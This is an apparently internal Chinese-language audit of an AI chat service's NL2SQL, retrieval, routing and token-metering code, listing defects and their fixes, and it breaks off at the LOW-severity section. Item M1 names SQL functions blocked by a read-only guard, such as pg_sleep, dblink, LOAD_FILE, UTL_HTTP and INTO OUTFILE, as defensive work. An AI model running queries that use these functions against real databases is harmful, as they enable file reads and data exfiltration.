# AI Chat 对话服务能力评估与改进建议

> 评估日期：2026-09-25　·　评估范围：`backend/app/services/chat_service.py` 及上下游对话服务
> 评估方法：对意图、检索、NL2SQL、多轮、多步、路由、计量、流式 8 个维度逐一读码审计，
> 全部结论附 `file:line` 证据，不依赖既有文档（文档已与代码漂移，见 §3.5）。

---

## 0. 一句话结论

对话服务已经是一条**能力齐全、安全护栏到位、计量意识强**的 L4 AI-Ready 流水线
（4 层路由 + 两阶段 NL2SQL + 13 类意图 + 多步拆解 + 全局过滤继承），但存在
**1 个已确认的运行时 TypeError 缺陷**、**9 处计量盲区（H1–H9）**、**多处向量/异常静默降级**
和**显著的文档-代码漂移**。当前短板集中在「流式路径与分步能力未对齐」「失败隔离
不彻底」「Token 计量有漏账」三块，而非能力缺失。

> **修复进度**：§2.1 的 C1（流式 TypeError）已于 2026-09-25 修复（见 §6）；
> LLM 可用性两个缺陷 D1/D2 与多步降级收尾 D3 已于 2026-09-26 修复并部署（见 §7）；
> §2.2 的 H1 / H2 / H8 / H9（四处「直调 LLM 绕过计量收口」）已于 2026-09-26 修复（见 §8）；
> §2.1 的 **C3 / C4**（多步硬失败隔离 + 重试上下文）已于 2026-09-26 修复（见 §9）；
> §3 的 **P0 第 5 项**（C 兜底分支的 global_filters 对称缺口）已于 2026-09-26 修复（见 §10）；
> §2.3 的 **M7**（回灌重试的二次失败详情 + 该次生成的用量）已于 2026-09-26 修复（见 §11）。
> §2.2 的 **H3 / H5**（历史注入预算 + 向量失败降级同口径）已于 2026-09-26 修复（见 §12），
> §3 P1 第 5、6 项同时闭合；收口 code-reviewer 复审 **APPROVE-WITH-NITS**（0/0/0/2 LOW，
> 两条带触发条件记录，见 §12 复审）。
> **§2.1（CRITICAL）已全部清零；§3 的 P0 路线图亦已清空**。
> §2.3 的 **M1 / M2**（SQL Guard 侧信道黑名单 + 拒绝原因回注重试反馈）已于 2026-09-26 修复（见 §13）。
> §2.2 的 **H6**（四处 score 公式口径不一）、§2.3 的 **M3**（计划解析静默吞错 + 空计划旁路）
> 与 **M6**（`chart_service` 重复方法与其同文件死代码）已于 2026-09-26 修复（见 §14），
> §3 P1 第 8、9、12 项同时闭合。
> §2.2 的 **H4 / H7**、§2.3 的 **M4 / M5 / M8 / M9 / M10** 已于 2026-09-27 全部处理完毕
> （见 §15，七项目六份 SSOT）；§3 P1 第 7 项、P2 第 11 项、P3 第 16–18 项同时闭合或改判。
> **仍待处理**：§2.4 LOW 全部、§2.5 文档漂移的其余条目（`sql_guard.py` 引用与 `IntentType` docstring 未复核）、
> P2 第 10 项剩余半（同上）、
> P2 第 13/14 项（拆大文件、魔数治理）、P3 第 18 项的后半（**真正支持非 OpenAI 兼容协议** —— 本批仅落地守卫）。
> **2026-09-27 追加批次**：「声明值 ≠ 生效值」批（[chore-config-duplicate-fields](../changes/chore-config-duplicate-fields/summary.md)）
> 关闭 P2 第 10 项的 `config.py` 半——9 组重复声明删除（生效默认值零变化）+ `AgentDefinitionRead.created_time` 怪胎修复
> + AST 类体字段守卫 + `jwtSecret` 启动自检 warning。
> **已立项待排期**：§13「残差」第 1 条（库侧只读兜底）已转为提案文件；
> ~~§15 末尾新登记三项~~（KPI 关键词索引的正确结构、空关键词语义判定、失败尝试的 LLM 用量采集）
> —— **2026-09-27 §15 第四拨已全部关闭**（[`chore-chat-15-tail-three-items`](../changes/chore-chat-15-tail-three-items/summary.md)）。
> **2026-09-27 追加批次**：`chore-doc-drift-cleanup`（详见
> [chore-doc-drift-cleanup](../changes/chore-doc-drift-cleanup/summary.md)）关闭 §2.5 剩余条目：
> `IntentType` docstring「DEFINE/MAP/METRIC 暂未接入」与 `sql_guard.py` 引用两条；同批重写
> `agent-loop.md` 整篇（删除虚构 LangGraph 实现 + 不存在路径引用）；`architecture.md:41`
> Agent Loop 路径更正；`nl2sql-engine.md:26` 意图数从 5 类更正为 13 类。
> **2026-09-27 第二拨**：`chore-doc-drift-cleanup-b`（详见
> [chore-doc-drift-cleanup-b](../changes/chore-doc-drift-cleanup-b/summary.md)）关闭上批漏掉的 3 处：
> `nl2sql-engine.md:85,139,142` L4 段「LangGraph StateGraph」更正为「Pure Python async while loop」+
> 4 类终止条件 + cost cap 默认值风险；`enums.py:146` IntentType docstring 补全 13 类四档分述
> （NL2SQL 主路径 / 不进 NL2SQL / 本体治理 / 领域拦截）；`owner.md:11` SQL Guard 引用
> `business_db_pool.py` 而非不存在的 `security/sql_guard.py`。
> 另：`fix-routing-metrics-l3-truth`（详见
> [fix-routing-metrics-l3-truth](../changes/fix-routing-metrics-l3-truth/summary.md)）
> 关闭 §2.5 `routing_layer` 从不写 `L3` 前端展示漂移——类型联合、`LAYER_COLORS`、折线图 mock、i18n 全部
> 去掉 L3，多步语义并入 L2。
> **2026-09-27 第三拨**：`fix-oracle-alter-session-best-effort`（详见
> [fix-oracle-alter-session-best-effort](../changes/fix-oracle-alter-session-best-effort/summary.md)）热修
> 生产故障：Oracle 实例拒绝 `ALTER SESSION SET READ ONLY`（ORA-02248 / <12c / 受限 PDB）时，对话链路
> 全部瘫痪（原代码直接抛错，无降级路径）。本批把 ALTER SESSION 包 try/except，失败记 warning + reason
> 继续执行原 SQL；纵深防御三层（解析层黑名单 + 只读账号 + ALTER SESSION）保留前两层的兜底。DBA 任务
> （确认版本 / 补 `ALTER SESSION` 权限）登记待执行，不在本批。

> **2026-09-27 第三拨补**（doc-drift 第三拨，`fix-oracle-set-transition-best-effort` 顺带清扫）：
> §2.5 评估文档中两条 ✅ 状态尚未落到表格行（`5 类活跃意图` 行的 doc 早被 chore-doc-drift-cleanup 修
> 为 13 类但表格未打 ✅；`L2 可选 CTE 增强：plan.requiresCte=True` 行的 doc 早被 chore-doc-drift-cleanup-b
> 加 ⚠️ 更更正注但表格未打 ✅）——本拨在 §2.5 表里给两行补 ✅ 标记；同时主动巡检发现
> `metric-pipeline.md:166,168` 两处漂移：迁移文件名 `0051_add_routing_fields.py` → `0051_add_routing_metrics_fields.py`
> （缺 `_metrics`），`agent-loop.md` 描述「L4 LangGraph Agent Loop」→「L4 纯 Python async while loop Agent」
> （agent-loop.md 整篇已重写，不再是 LangGraph）。**至此 §2.5 表格 7 行全部 ✅ 关闭**。

> **2026-09-27 第四拨**（§15 末尾三项）：[`chore-chat-15-tail-three-items`](../changes/chore-chat-15-tail-three-items/summary.md)
> 三项落地——①KPI 关键词索引结构（SSOT 化进 `KpiMatchCache` 类 docstring，登记未来 Aho-Corasick + 准入
> 压测数据 +42.3MB / 500 关键词 / 30 字字典）②空关键词语义（`findByAnyKeyword` 加 `if not kw: continue`
> 防御，substring `""` 副作用 → no-op）③失败尝试 LLM 用量（`LlmClientError.tokens: tuple[int, int] | None`
> 字段 + `consumedTokens` 第二档优先级 + `completeStream` 累计挂上 + `complete_with_tools` 后处理失败挂上
> + 顺手修 `openai_client` ↔ `factory` 潜在 circular import）。单测 46/46 全绿。**§15 末尾三项至此全部 ✅ 闭合**。

> **2026-09-28 §2.4 LOW 启动**（仅 SSOT 化 + 规范落地，**无代码改动**）：本次会话授权继续
> §2.4 LOW（文件拆分 + 魔数治理）后即用户切回「只做评估文档 + 规范」最小方案——
> - **魔数治理规范**：[`Harness/rules/魔数治理.md`](../../rules/魔数治理.md)，含三档决策（治理/不改/判别不清）
>   + 14 项候选常量清单（`_CLASS_FILTER_TOP_K`(15) / `_FEW_SHOT_*`(3/0.6/400) / `_CONTEXT_*_LIMIT`(500/500/4000)
>   / `_STATE_HISTORY_FIELD_LIMIT`(500) / `_REFINE_MAX_LIMIT`(1000) / `_VALUE_SAMPLE_VALUE_MAX`(30)
>   / `_OWNER_HINT_MAX_CLASSES`(3) / `_CRITICAL_DIGEST_MAX_*`(50/200) / `_NL2SQL_MAX_TOKENS`(2048)），
>   复用 chat_service 现有 `_getClassFilterMaxClasses` / `_getAdsRecallWeight` / `_isL4AgentLoopEnabled` 三例
>   模式（不缓存 + 失败不阻断 + 非正抛错 + 就近读取）；
> - **§2.4 LOW 行**改为 ⏳「规范已落地，14 项候选清单已 SSOT 化，Phase 1 拆分 + Phase 2 治理下次会话」；
> - **完整 3 阶段计划**：`/Users/sunql/.claude/plans/rosy-beaming-phoenix.md`（拆分 / 治理 / §15 残差收尾）。
> ⚠️ **本批零代码风险**——只写两份新文档 + 评估文档 §2.4 行一改 + §0 新增 1 段，**未触任何源码文件**；
> 前端本次也不需要 rebuild（无 i18n 改动）。

---

## 1. 能力全景（已具备）

### 1.1 意图理解（`intent_service.py`）

| 能力 | 实现 | 成本 |
|---|---|---|
| 13 类意图分类 | `QUERY / NEW_QUERY / REFINE / FOLLOW_UP / CLARIFY / DEFINE / MAP / METRIC / CHITCHAT / SUPPLIER_360 / SUPPLIER_RISK / GRAPH_REASONING / AGENT_RUN` | 纯关键词+正则，**零 LLM** |
| 省略式追问 | `isEllipsisFollowUp`（「4月份呢？」），疑问词前缀排除守 N6 | 零 LLM |
| 斜杠指令 | `/metric` `/define` `/map`，优先级最高 | 零 LLM |
| 显式多步守卫 | `rule_based_split` 命中即 NEW_QUERY，防 REFINE/FOLLOW_UP 误吞 | 零 LLM |
| Agent 语义路由 | `AgentRoutingService` 关键词评分：≥0.7 自动调度、0.4–0.7 建议卡片 | 零 LLM |
| 实体抽取 | 供应商编码（5-9 位）、维度/指标/图表类型、跳数、agent_code | 零 LLM |

### 1.2 语义检索匹配（类召回 + RAG）

| 能力 | 实现 |
|---|---|
| 类召回 | Milvus 向量 `topK=15` → 1-hop JOIN 扩边 → `max=30` 截断 → 层级排序 |
| 层级优先级 | `_LAYER_RANK`：ADS(0)>DWS(1)>DWD(2)>DIM(3)>ODS_DICT(4)>ODS_BUSINESS(5)>UNKNOWN(6) |
| ODS 治理 | 业务表默认排除、显式 `ODS_*` 表名解锁、维度词触发 DIM 全量 |
| ADS 加权 | 命中 `ADS_` 前缀类 `score × 1.5`（system_config 可调） |
| L1 KPI 匹配 | Jaccard 相似度（每 KPI 独立 `match_threshold` 0.75）+ 精确别名 1.0，缓存预热 |
| RAG 双通道 | doc_qa（`document_embeddings`）+ wiki_qa（`wiki_page_embeddings`），score=`1/(1+d)` |
| 辅助召回 | 词库 TermDictionary、特征目录 FeatureCatalog、值域采样 valueSampler、few-shot（top3） |
| 供应商名解析 | `supplier_name_resolver`（裸公司名规范化） |

### 1.3 NL2SQL 转换（`nl2sql_service.py`）

| 能力 | 实现 |
|---|---|
| 两阶段生成 | 计划 → `validatePlan` 纯代码校验（`maxPlanAttempts=2`）→ SQL |
| 路由（**3 条路径，非 4 层链**） | L1 KPI 语义匹配 → L2 LLM 单 SQL；多步子问题走独立 `_executeMultiStep`（同记 `routing_layer="L2"`）；L4 Agent Loop（5 工具迭代）由 `IntentType.AGENT_RUN` **单独触发**。~~L3 CTE 链~~ **不存在**（2026-09-27 删；2026-09-27 前也从未接线） |
| SQL Guard | `business_db_pool._assert_read_only` + `_assertNoHiddenWrites`，仅 SELECT/WITH |
| 派生指标 | formula 必填校验（占比/比率/ratio/percent…） |
| 范围感知行数 | `_applyScopeRowLimit`：有范围不截断、无范围兜底 100 |
| REFINE 捷径 | `applyRefineDirect` 纯代码改写排序/筛选/行数，**零 LLM** |
| 准确性增强 | 跨类属性归属 hint、属性归一化（property ref normalize）、JOIN 等式归一化、schema digest、多方言（Oracle/MySQL/PG） |

### 1.4 多轮对话（状态 + 追问）

| 能力 | 实现 |
|---|---|
| 会话状态 | `session_query_state`（JSONB）存 last_plan/SQL/columns/turn_count |
| 状态注入 | REFINE/FOLLOW_UP 轮 `<previous_query_state>` 注入两阶段 prompt |
| 追问级联 A/B/C | A 省略式正则（零 LLM）/ B 改写+多步重跑 / C 短句不可回答兜底重试 |
| 历史上下文 | `_loadRecentRounds` 最近 10 条（5 轮）注入 NL2SQL + answer prompt |

### 1.5 分步执行拆解（多步 NL2SQL）

| 能力 | 实现 |
|---|---|
| 拆步 | 规则拆步（`第X步`/序数副词，零 LLM）+ LLM `plan()`（最多 4 子步） |
| 复合问题 | L1.5 启发式 `_looks_like_compound_question`（多动词并列 / 头+列表） |
| 跨步注入 | `[entity_list]`（≤50 行字符串列，2000 char）/ `[aggregate]`（600 char） |
| 全局过滤继承 | feat-multistep-global-filter A+B：措辞强化 + `[global_constraints]` 预抽取 |
| 汇总 | `StepAggregator` 聚合各步结果生成最终回答 |
| 不可变模式 | `StepExecutionContext/StepResult/GlobalFilters` 全 frozen dataclass + `with_step` |

### 1.6 模型路由 + Token 计量

| 能力 | 实现 |
|---|---|
| 路由 | 加权随机 + 成本阈值熔断 + 会话亲和（3 轮）+ 预算降级 + 最便宜 fallback |
| 可用性过滤 | `_usableModelConfigs`：自动路由候选池剔除构造不出客户端的配置（无 API key），判据复用 `createClient`（SSOT） |
| 降级重试 | `_callWithFallback`：`LlmClientError` → 记 zero-token → 降级重试一次 |
| 无可用 LLM | `client is None` → `LLMUnavailableError` → **503**（与 `doc_qa`/`wiki_qa` 同口径；2026-09-26 补齐，此前为裸 `AttributeError` 500） |
| 计量 | `TokenUsageService` + tiktoken（OpenAI/代理）/ 启发式（Ollama CJK） |
| 多 provider | OpenAI / Azure / 兼容代理 / Ollama，Fernet 加密凭据 |

> 关键边界：可用性过滤**不**覆盖「key 合法但 endpoint 不可达」（如本地 ollama 未起）——
> 那种情况 `createClient` 正常返回客户端，失败发生在调用期，交 `_callWithFallback` 处理。

### 1.7 流式 + 图表 + 数据摘要

| 能力 | 实现 |
|---|---|
| SSE 事件 | `meta/plan/sql/chart/token/done/error/qa_*/step_plan/step_result/class_recall` |
| 图表 | `ChartService` 规则推荐（PIE 行≤6 等）+ LLM 生成 ECharts option，异常回退规则 |
| 数据摘要 | `summarize_data`：≤100 行全量，>100 行 head/tail 5 行 + truncated |
| 不可回答 | 固定前缀 + `unanswerable_suggestion`（缺失术语 vs 本体词表，≤6 类） |

---

## 2. 存在的不足（按严重度分级，全部附证据）

### 2.1 CRITICAL —— 运行时正确性缺陷

| #   | 缺陷                                                                                                                                                                                                                                             | 状态                                             | 证据                                      |
| --- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- | --------------------------------------- |
| C1  | **流式 FOLLOW_UP 多步传参错误 → TypeError**。`_streamQuery` 在 FOLLOW_UP-上一轮多步分支调用 `_streamMultiStep(..., global_filters=gf2)`，但 `_streamMultiStep` 签名**无 `global_filters` 参数**。该路径（流式追问多步）必抛 `TypeError`，被外层 `except Exception` 吞成通用 internal error 事件。 | ✅ **已修复**（2026-09-25，见 §6）                     | `chat_service.py:3088` vs `3358-3370`   |
| C2  | **流式多步全局过滤完全缺失**。显式/复合多步的流式分支（`_streamQuery`）不调 `_resolveGlobalFilters`，`_streamMultiStep` 构建 `StepExecutionContext` 不含 `global_filters`。feat-multistep-global-filter 的 A/B 层在**整个流式多步路径全部失效**（非流式正常）。                                         | ✅ **已修复**（2026-09-25，见 §6）                     | `chat_service.py:3050-3076`、`3386-3391` |
| C3  | **多步失败隔离不覆盖硬异常**。仅「unanswerable plan」软失败被隔离；`_planAndGenerateSql` / `_runQueryWithRetry` 抛出的硬异常会中止整条多步序列，丢弃已完成步骤，**无部分结果恢复**。                                                                                                                  | ✅ **已修复**（2026-09-26，见 §9）                      | `chat_service.py:1783`、`1878-1887`、`3801-3808` |
| C4  | **多步执行错误重试用错问题**。`_runQueryWithRetry` 重试时用 `dto.question`（原始复合问题）而非 `step_plan.sub_question`，且 `priorState=None`，同时丢失子问题范围与跨步注入文本。                                                                                                             | ✅ **已修复**（2026-09-26，见 §9）                      | `chat_service.py:3790-3795`                    |

> C1/C2 是 feat-multistep-global-filter 的「半接线」遗留：只接通了非流式
> `_executeMultiStep`，流式 `_streamMultiStep` 的签名未同步、流式入场点未接
> `_resolveGlobalFilters`。属当前工作区未提交代码中的真实缺陷。

### 2.2 HIGH —— 计量盲区与静默降级

| # | 缺陷 | 状态 | 证据 |
|---|---|---|---|
| H1 | **全局过滤抽取 LLM 调用不计量**。`extract_global_filters` 直调 `client.complete` 但只返回 `GlobalFilters`（无 token 数）；`_resolveGlobalFilters` 写 0-token 假 marker，注释「token 已计到 plan/split 路径」**与实际不符**。 | ✅ **已修复**（2026-09-26，见 §8） | `step_query_planner.py:201-214`、`chat_service.py:1879` |
| H2 | **L4 Agent Loop 不写 session_token_usage**。`run_agent_loop` 每次迭代 `complete_with_tools` 不计量，只用**硬编码 gpt-4o-mini 价格**估算 USD，token 数丢失。 | ✅ **已修复**（2026-09-26，见 §8） | `agent_runtime_service.py:327-336`、`chat_service.py:758` |
| H3 | **历史注入无 token/字符预算**。`_buildContextPrompt` 全文拼接 `session_message.content` + `[SQL:...]`，无截断；一条超长 SQL/答案会无限膨胀后续每次 NL2SQL + answer prompt。 | ✅ **已修复**（2026-09-26，见 §12） | `chat_service.py:4124-4144` |
| H4 | **客户端断连无处理**。`CancelledError`（`BaseException`）不被任何 `except` 捕获；`_storeSessionMessages` 只在流尾执行，断连即丢整轮（无部分答案、无历史落库）。 | ✅ **已修复**（2026-09-27，见 §15） | 实际位置：SSE 路由 `app/api/v1/chat.py:46`（`StreamingResponse` 在 `:80`）；生成器 `chat_service.py:3222`（`processMessageStream`）→ `:3439`（`_streamQuery`）；流内落库点 `:3744`/`:3750`（单步）与 `:3902`/`:3908`（多步）；`_storeSessionMessages:4717`。**原行号（`2904-2922`/`3303`）已过期** |
| H5 | **向量失败静默降级到全 schema**。类召回异常回退 `return list(allClasses)`，**不过滤 ODS、不截断 max**——正是召回剪枝要解决的老问题在 Milvus/embedding 挂掉时原样回来。 | ✅ **已修复**（2026-09-26，见 §12） | `chat_service.py:1269-1280`、`1352-1359` |
| H6 | **3 处 score 公式不一致（DRY 违反）**。`embedding_service`/`ontology_service` 有 `round(,4)` + `max(0)`；`wiki_vector_service` 无 round；`rag_service` 无 `max(0)` 无 round——负距离得 score>1，缺 `distance` 键直接 `KeyError`。 | ✅ **已修复**（2026-09-26，见 §14） | `embedding_service.py:29-31`、`ontology_service.py:1198`、`wiki_vector_service.py:264`、`rag_service.py:299` |
| H7 | **provider_type 死元数据**。`embedding_provider_factory` 从不读 `provider_type`，全部当 OpenAI 兼容；维度守卫只对 DB-provider 路径生效，env 回退路径不校验。 | ✅ **已修复**（2026-09-27，见 §15）。⚠️ **2026-09-27 补充关闭**：`docker/.env` + `backend/.env` 实际写入 `EMBEDDING_DIMENSION=1024`（与 active provider id=2 oMLX bge-m3 8bit 一致），env 回退路径的维度守卫**现已生效**：声明正确（1024=Milvus 集合维度）⇒ 静默通过；声明错误（768 vs 1024 实测）⇒ `ConfigError` fail-fast。验证 3 探针：active 路径返回 `bge-m3-mlx-8bit`、env fallback 1024 通过、env fallback 768 抛 ConfigError。SSOT 写在 `.env` 注释里（与 `_assertEnvFallbackDimension` docstring 同口径）。 | `embedding_provider_factory.py:140-200`（`_assertProviderTypeKnown:140` / `_assertDimensionMatches:160` / `_assertEnvFallbackDimension:180`）；**原行号 `48-61` 已过期** |
| H8 | **doc_qa 不写 token ledger**（wiki_qa 写），违反「每次 LLM 调用必须计量」约束；且无命中时 doc_qa 存 `citations=[]` 而 wiki_qa 存真实 citations，行为不一致。 | ✅ **已修复**（2026-09-26，见 §8） | `wiki_qa_service.py:215-224` vs `rag_qa_service.py:161-162` |
| H9 | **成本单位不一致**。`supplier_risk_service._generateRiskPoints` 用硬编码 **CNY** 0.001/0.002，系统其余用 config 的 **USD**。 | ✅ **已修复**（2026-09-26，见 §8） | `supplier_risk_service.py:275-280` |

> H1/H2/H8/H9 同一根因：**直调 `client.complete(...)` / `complete_with_tools(...)`
> 绕过计量收口**，各自违反核心约束 #3。四处一次修完，SSOT 见
> [`Harness/changes/fix-llm-metering-blindspots/`](../../changes/fix-llm-metering-blindspots/summary.md)。
>
> 修 H9 带来一处**必须知会的行为变更**：供应商风险的 LLM 路径此前在生产上从未跑过
> （`createClient(None)` 恒返回 `None` → AttributeError 被吞 → 永远是模板文案），
> 修复后只要解析得出配置就真调 LLM ⇒ 该路径的**延迟与成本从 0 变为非 0**，文案也会变。
> 受影响：`supplier_risk` 意图、`supplier_risk_agent` 工具。

### 2.3 MEDIUM —— 健壮性与可维护性

| # | 缺陷 | 证据 |
|---|---|---|
| M1 | ~~**SQL Guard 侧信道函数未覆盖**：缺 `pg_sleep`/`pg_advisory_lock`/`dblink`/`SLEEP`/`BENCHMARK`/`LOAD_FILE`/`UTL_HTTP`；sqlparse 跳过 `Literal/Comment` 的隐患。~~ ✅ **已修复（2026-09-26，见 §13）**。<br>⚠️ **同行的「`INTO` 过度拦截（含良性 `SELECT…INTO`）」经实测修正**：四种 `INTO` 子句形态（PG 建表 / MySQL `OUTFILE` / 变量赋值 / 尾随）全部**应当拒**；唯一被误拒的合法形态是「未加引号的 `AS into` 别名」（PG 实测接受），属安全闸门应有的过拦偏向，**不改**（见 §13 决策原则）。 | `business_db_pool.py` |
| M2 | ~~**SQL Guard 拒绝反馈不具体**：LLM 只见「未通过安全校验」，无法自愈守卫违规。~~ ✅ **已修复（2026-09-26，见 §13）**。 | `nl2sql_service.py:2076-2082` |
| M3 | ~~**`QueryPlan.from_dict` 吞所有解析错误**：损坏输入静默变空 tuple，掩盖根因（文档明言「绝不抛错」）。~~ ✅ **已修复**（2026-09-26，见 §14）。**并额外修掉一个真实旁路**：返回非 None 的空计划既不入重试也不写日志，直接进 `generateSql`（空计划无引用可校验 ⇒ 能过 `validatePlan` ⇒ 模型可自由编造表名）。**半空计划方案 A + 方案 B 均已堵（2026-09-27）**：方案 A 移除 `rowLimit`/`perGroupLimit` 两个「仅限制」字段；方案 B（本批）移除 `target` 单独存在的「有内容」判断——仅当全部 7 项引用（selectedClasses/selectedProperties/conditions/aggregations/groupBy/joins/sortBy/partitionBy）皆为空才判空。**`isUnanswerable` 短路**：`target="无法回答"` 在 `_parsePlanOutcome` 早于 `_isEmptyPlan` 短路放行，保留模型友好回答语义。**重试反馈可操作化**（前置核对 D）：PLAN_EMPTY 且有 drops 时，错误消息带具体丢失字段（`field:REASON`）。**plan system prompt 加规则 10**：显式告诉 LLM「半空计划会被拒」从源头降低产出。SSOT `fix-plan-scope-gate-and-trigram/summary.md` + `fix-plan-scope-gate-b/summary.md`。 | `query_plan.py:203-206`、`nl2sql_service.py:60` |
| M4 | ~~**无同模型瞬态重试**：`generateQueryPlan`/`generateSql` 内部不捕获瞬态 LLM 异常，只靠模型 fallback（换模型≠同模型重试）。~~ ✅ **已修复（2026-09-27，见 §15）**。判定逻辑抽出叶子模块 `app/services/llm_retry_policy.py`（不得 import `chat_service`，否则成环），两个方法在**各自现有的 `for attempt` 循环内**接 `_completeWithTransientRetry`；**并顺带修掉一个比原文更严重的计量盲区**：瞬态异常从循环**裸逃逸**时，前几轮**已累加**的 token 被静默丢弃（第 1 轮成功 3000/500 + 第 2 轮抛出 ⇒ 3500 凭空消失）—— 现改为把已累加用量挂到逃逸异常上。预算按实测收敛为**仅首轮允许额外一次**（`allowRetry = attempt == 0`），最坏 `(maxRetries+1)+1 = 4`，不再「每轮翻倍」。 | 实际接缝 = `nl2sql_service.py:1695`（plan）、`:2157`（sql）两处 `completeWithTransientRetry(...)`（模块 `app/services/llm_retry_policy.py`）；**原行号 `1608`/`2039` 已过期** |
| M5 | ~~**L3 CTE 引擎是死代码**：`_executeChainedSteps`/`_executeSingleChainedStep` 仅测试引用，无生产接线，且含未计量 LLM 调用。~~ ✅ **已删除（2026-09-27，见 §15）**。按用户口径只删引擎、**保留 `prior_cte` 能力**（`chained_step_plan.py` 的 `render_prior_cte` 留作纯函数工具，契约定为 **WITH-less 片段**，见 M8）；同时保留活代码 `_summarizeStepData`（现 `:2416`，调用点 `:1282`/`:2238`/`:3781`）。**未采纳「接线」那半句**：该引擎唯一的能力（跨步 CTE 串联）已由 `prior_cte` 注入承担，接线是重复实现。 | 删除前位置 `chat_service.py:2455-2495`（`_executeChainedSteps`）、`:2498-2543`（`_executeSingleChainedStep`）（**现已不存在**）；**原行号 `1935-2023` 已过期**；同批删除 `app/tests/services/test_l3_chained_steps.py` 与三处导入 |
| M6 | **重复定义**：`_buildOptionPrompt` 两次（`chart_service.py:121/226`，同名同签名同注释，后者静默覆盖前者——前一份是死代码）。<br>⚠️ **2026-09-26 复核修正**：本行原写「`_consumedTokens` 两次（`chat_service.py:4048/4052`）」**不成立**——当前只剩一个定义（`chat_service.py:4249`），行号也对不上；评估当日应是笔误或事后已清理。 | ✅ **已修复**（2026-09-26，见 §14）。同文件死代码：2 处 F401 未用导入 + 零调用的 `_inferColumnType`（单数；活的是复数 `_inferColumnTypes`）+ I001；**并新增常驻 AST 守卫**（Python 对类体重复方法零告警，这类腐化只能靠守卫拦住）。 | `chart_service.py:121`、`226` |
| M7 | ~~**`_runQueryWithRetry` 丢弃第二次错误详情**~~ ✅ **已修复（2026-09-26，见 §11）**。修复分两批：①C3/C4 批（见 §9）让重试的**新错误**进日志、重试生成的 token 在多步路径落账；②本批把二次失败**详情与用量挂到上抛异常私有属性**上（`_attachRetryFailure` / `_attachRetryGenTokens`，不改异常类型/消息），单步两条路径 + 多步路径都落账，用户可见步骤文案改为「首次：…；重试…：…」（两段各自脱敏 + 各自限量）。**同时闭合了复审发现的第三个漏点**：重试**生成自己失败**时 `Nl2SqlError.tokens` 此前无人取用 ⇒ 该次调用白花。 | `chat_service.py` `_runQueryWithRetry` / `_stepFailedError` / `_accountRetryGenUsage` |
| M8 | ~~**`prior_cte` 契约不一致**：docstring 说可无 `WITH`，但 `_assert_read_only` 会拒绝无 `WITH` 形式（当前仅 `render_prior_cte` 输出可过，潜伏）。~~ ✅ **已修复（2026-09-27，见 §15）**。⚠️ **本行原文的因果方向是反的**（实测更正）：不是「拒绝无 `WITH` 形式」，而是**放过重复 `WITH`** —— `render_prior_cte` 产出带前导 `WITH` 的片段，`generateSql` 又拼一次 `f"WITH {prior_cte}"` ⇒ `WITH WITH ...`；`_assert_read_only` **只看首个 token**（`WITH` 在白名单）故**放行**，到库侧才报语法错，再被 `chat_service` 的宽 `except Exception` 吞成 `success=False`（用户只看到「查不出来」）。修法：**WITH-less 片段**成为唯一合法形态（`render_prior_cte` 不再自带头 `WITH`），入口 `_assertPriorCteSafe` **显式拒绝**带前导 `WITH` 的入参；`_assert_read_only` **无法**复用于该片段（无 `WITH` 时首 token 是 CTE 别名），故单独校验（`WITH <片段> SELECT 1` 试跑）。 | 实际位置 `nl2sql_service.py:2195`（唯一 `WITH` 拼装点）、`_assertPriorCteSafe:488`（调用点 `:2142`）、`_renderPriorCtePart:461`（docstring）、`chained_step_plan.py:64`（`render_prior_cte`）；**原行号 `414-416` 已过期** |
| M9 | ~~**Milvus 16384 上限**：`listAllEmbeddings` 截 16384，超量后对账 diff 会算错（无 guard）。~~ ✅ **已修复（2026-09-27，见 §15）**。⚠️ **本行原文低估了破坏力**（实测更正）：截断结果有两个**破坏性**消费者 —— ① `scripts/backfill_milvus_embeddings.py --cleanup` 走**删集重建**，从截断结果重建 ⇒ 窗口外向量**永久丢失**（不是少读一次，是删掉且不再写入）；② `ontology_service` 对账把窗口内外的「仍存在」判为缺失并反复插入 ⇒ **永不收敛**。改 `Collection.query_iterator` 迭代取全量（签名与字段集不变，两个消费者零改动）。**规模实测（诚实标注）：四个集合当前 7264 / 561 / 17 / 43，全都远低于 16384** ⇒ 本项修的是**潜伏的悬崖，不是正在发生的事故**；但 7264 距 16384 已不远、修复成本低、破坏力大，故按真缺陷处理。 | 实际位置 `milvus_client.py:250`（`listAllEmbeddings`）、`:278`（新增 `_queryAllRows`，整数倍 warning 在 `:312`）、`:40`（`_MILVUS_QUERY_PAGE`）；**原行号 `245-265` 已过期**；兄弟函数 `:570`/`:716` 的 `limit=` 属 **expr 受限的合法护栏**（已用代码骨架计数复验），保留 |
| M10 | ~~**KPI 缓存线性扫描**：`findByAnyKeyword` O(keywords×catalog) 无倒排索引，随目录增长退化。~~ ✅ **已处理（2026-09-27，见 §15）—— 改判：放弃倒排索引实现，改为对真实实现的差分属性测试**。**准入前压测推翻本行的前提**（三条实测）：① **收益为零** —— 真实目录只有 **13 个 KPI / 约 50 个关键词**，线性扫描本就亚毫秒级，买不到任何**可测**收益；② **代价是两处静默偏离** —— 空关键词 `""`（`"" in s` 恒真）旧实现命中**全部** KPI，子串索引永远不含 `""` ⇒ 恒返回 `[]`；`refreshOne`/`onKpiChanged` 只改 `_by_keyword`、索引**不重建** ⇒ 改动过的关键词**漏匹配** + 未改动的关键词**顺序漂移**；③ **不 scale** —— 500 关键词 × 30 字实测 **+42.3 MB** 纯索引开销（5,000 关键词约 420 MB）。本条目下**真正缺的是覆盖**：现有测试用的全是**自行重写另一套算法的桩**（`test_kpi_semantic_match_service.py::_StubCache`：外层遍历 KPI、命中即 `break`，按目录序），而真实顺序是「用户关键词外层 × `_by_keyword` **插入序**内层」⇒ **真实顺序零覆盖** —— 这才是该修的风险（下游 `kpi_semantic_match_service` 按 Jaccard 排序，同分时**顺序即结果**）。**prod 校准**：`kpi_catalog` 12 个 KPI 的 `semantic_keywords` **全为 NULL** ⇒ 该快路径在生产上目前**是惰性的**（任何关键词查询命中 0 条）。**未采纳的两项**：不改任何生产代码（纯 `test:`）；不顺手改「`[""]` 命中全部」这个怪癖（属**语义判定**，需产品判断，已登记为独立条目）。 | 实际位置 `kpi_match_cache.py:68-87`（`findByAnyKeyword`）、`:116-138`（`onKpiChanged`）、`:140-169`（`refreshOne`）；**原行号 `79-87` 是函数中段**；新增测试 `app/tests/unit/test_kpi_match_cache.py`（363 行，17 例） |

### 2.4 LOW —— 优化项

